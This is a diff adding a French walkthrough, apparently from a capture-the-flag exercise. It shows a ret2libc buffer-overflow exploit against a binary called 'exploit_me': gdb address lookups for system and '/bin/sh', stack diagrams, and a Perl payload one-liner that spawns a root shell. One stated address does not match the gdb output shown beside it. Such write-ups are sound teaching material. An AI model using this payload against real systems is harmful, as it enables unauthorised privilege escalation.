@@ -532,3 +532,75 @@ bool main(char **argv, char **envp)
 Le programme est très simple : il affiche sur l'entrée standard le premier argument reçu en ligne de commande. Néanmoins, on remarque que le programme alloue un buffer de 140 octets et copie l'argument dedans. Si notre agrument excède 140 charactère, le progamme `SEGFAULT`.
 
 Nous allons donc exploiter ce `SEGFAULT` avec la faille `Ret2libc`.
+
+### Adressage
+Pour éxcuter notre shell, nous avons besoin de trouver l'adresse de la fonction `system` et de la chaine `"/bin/sh"`. Le but étant de faire un call à `system` avec ce paramètre. Pour cela, on exécute `gdb` sur notre exécutable avec les commandes suivante :
+```
+gdb exploit_me
+[...]
+(gdb) break main
+[...]
+(gdb) run
+[...]
+```
+
+#### system
+
+```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+```
+L'adresse de `system` est `0xb7e6b060`.
+
+#### /bin/sh
+
+En hexadécimal, `/bin/sh` = `0xb7fa92e8`.
+```
+(gdb) x/s 0xb7fa92e8
+0xb7f8cc58:	 "/bin/sh"
+```
+L'adresse de `"/bin/sh"` est `0xb7f8cc58`.
+
+## Stack
+Lors d'un appel à une fonction, la stack ressemble à ceci :
+```
+[...]
+[function parameter 2]
+[function parameter 1]
+[function ret]
+---------------------- EBP
+[local variable]
+[local variable]
+---------------------- ESP
+```
+Notre but est de faire ressembler la stack à ceci, pour exécuter la fonction `system` avec notre `"/bin/sh"`.
+```
+[...]
+[/bin/sh]       // system function argument
+[system ret]    // system return address
+[system]        // system call
+---------------------- EBP
+[buffer[140]]
+---------------------- ESP
+```
+Avant de remplir notre buffer, notre stack est semblable à celle ci dessous :
+```
+[...]
+[reg]
+[reg]
+---------------------- EBP
+[buffer[140]]
+---------------------- ESP
+```
+En remplissant plus de 140 octets dans notre buffer, nous somme capable d'écrire dans les registres suivants. Nous pouvons donc créer un buffer qui, avec un overflow, écrira nos instructions `system` dans les registres suivants. Nous devons suivre ce schéma :
+```
+[ Buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ]
+```
+Cette commande Perl permet de générer notre buffer :
+```perl
+perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"'
+```
+En exécutant la commande suivante, on est capable de lancer un shell avec les droits administrateur :
+```
+./exploit_me `perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"'`
+```
